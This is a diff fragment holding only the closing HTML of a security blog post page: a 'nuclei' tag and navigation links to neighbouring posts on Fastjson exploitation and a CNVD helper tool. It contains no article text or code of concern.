+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/nuclei/">nuclei</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/fastjson%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB%E5%BE%85%E5%86%99/" class="prev" rel="prev" title="Fastjson利用姿势汇总"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Fastjson利用姿势汇总</a>
+            <a href="/%E8%AE%B0%E4%B8%80%E6%AC%A1cnvd%E8%BE%85%E5%8A%A9%E5%B7%A5%E5%85%B7%E7%9A%84%E7%BC%96%E5%86%99/" class="next" rel="next" title="记一次CNVD辅助工具的编写">记一次CNVD辅助工具的编写<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container">
+			<div class="footer-line">
+				<span id="run-time"></span>
+			</div><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.120.3">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">ev1l0o4g</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/algoliasearch@4.13.1/dist/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/typeit@8.6.0/dist/index.umd.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":50},"comment":{},"data":{"id-1":"ev1l0o4g's blog","id-2":"ev1l0o4g's blog"},"search":{"algoliaAppID":"","algoliaIndex":"","algoliaSearchKey":"","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":30,"type":"algolia"},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/js/theme.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/jquery@2.1.3/dist/jquery.min.js"></script><script type="text/javascript" src="/js/custom.js"></script></body>
+</html>
